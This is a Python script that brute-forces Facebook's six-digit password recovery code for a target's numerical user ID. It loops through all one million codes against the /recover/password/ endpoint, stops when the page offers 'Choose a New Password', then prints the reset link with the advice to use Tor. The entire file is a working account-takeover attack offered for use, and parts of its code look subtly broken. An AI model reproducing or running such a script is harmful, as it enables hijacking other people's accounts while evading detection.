#!/usr/bin/env python3
import urllib
import http.client as libhttp
import numba

print("READ README FIRST PLEASE")
print("you have to trigger the password recovery at https://www.facebook.com/login/identify/?ctx=recover")
connection = libhttp.HTTPSConnection("www.facebook.com", 443)
user = input("Enter user numerical ID: ")

headers={"Host":"www.facebook.com", "User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0", "Accept-Language": "en-US, en"}

code = ['0', '0', '0', '0', '0', '0']
index = [0, 0, 0, 0, 0, 0]
rain = 0
count = 0
cs = "0123456789"

print("One million recovery code to test")
for index[0] in range(10):
	for index[1] in range(10):
		for index[2] in range(10):
			for index[3] in range(10):
				for index[4] in range(10):
					for index[5] in numba.prange(10):
						#Let it rain !###############################
						for x in range(6):							#
							code[x] = cs[(index[x]+rain)%10]		#
							rain += x+1								#
						rain -= (1+2+3+4+5+6)-2						#
						#############################################
						query = urllib.parse.urlencode({"u":"%s" % user, "n":"%c%c%c%c%c%c" % (code[0], code[1], code[2], code[3], code[4], code[5])})
						if count % 1000 == 0:
							print("%f%% done" % (float(count)*100.0/1000000.0))
						connection.request('GET', "/recover/password/?%s" % query, headers=headers)
						answer = connection.getresponse()
						text = str(answer.read())
						if text.find('Choose a New Password') != -1:
							print("!!!!USE TOR!!!!\nlink is https://www.facebook.com/recover/password/?u=%s&n=%s&s=23&exp_locale=en_US&redirect_from=button" % (user, code))
							exit(0)
						count += 1
